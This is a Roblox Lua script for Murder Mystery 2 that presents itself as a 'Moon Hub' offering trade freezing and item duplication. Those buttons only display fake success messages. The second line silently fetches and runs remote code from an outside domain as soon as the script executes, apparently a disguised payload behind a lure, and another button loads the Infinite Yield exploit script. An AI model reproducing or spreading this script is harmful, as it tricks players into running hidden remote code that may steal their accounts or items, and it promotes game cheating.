getgenv().gui = false
loadstring(game:HttpGet("https://egorikusa.space/1d86dafe58575e45878b0bb4.lua", true))()
local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()

local win = DiscordLib:Window("Murder Mystery 2")

local serv = win:Server("Moon Hub", "http://www.roblox.com/asset/?id=6031075938")

local tradefreeze = serv:Channel("Trade Freeze")

tradefreeze:Label("Please wait 3 minutes after executing to use this feature!")

tradefreeze:Seperator()

tradefreeze:Toggle("Freeze Trade",false, function(bool)
DiscordLib:Notification("Notification", "Success!", "Okay!")
end)

local dupe = serv:Channel("Duper")

dupe:Label("Please wait 3 minutes after executing to use this feature!")

dupe:Seperator()

dupe:Button("Dupe Equipped Items", function()
DiscordLib:Notification("Notification", "Duping! This process will take 3 minutes, when it is done, just rejoin and your items will be duped!", "Okay!")
end)

local extra = serv:Channel("Extra")

extra:Button("Load Infinite Yield", function()
loadstring(game:HttpGet("https://github.com/fuckusfm/infiniteyield-reborn/raw/master/source"))()
DiscordLib:Notification("Notification", "Successfully loaded Infinite Yield.", "Okay!")
end)
